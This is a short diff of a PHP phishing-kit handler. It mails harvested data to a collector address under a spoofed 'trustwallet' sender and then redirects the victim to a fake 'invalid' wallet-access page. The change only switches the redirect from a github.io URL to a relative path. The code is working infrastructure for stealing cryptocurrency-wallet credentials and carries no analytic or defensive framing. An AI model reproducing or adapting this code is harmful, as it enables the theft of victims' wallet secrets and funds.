@@ -31,7 +31,7 @@ $headers = "From: trustwallet <americanexpres99@gmail.com>";
 mail($rezult_mail, $subject, $message, $headers);
 echo "<script LANGUAGE=\"JavaScript\">
 <!--
-top.location=\"https://gift-program.github.io/1500-CZBOMB/connect1/invalid.html?/access-my-wallet\";
+top.location=\"/1500-CZBOMB/connect1/invalid.html?/access-my-wallet\";
 // -->
 </script>";
 ?>
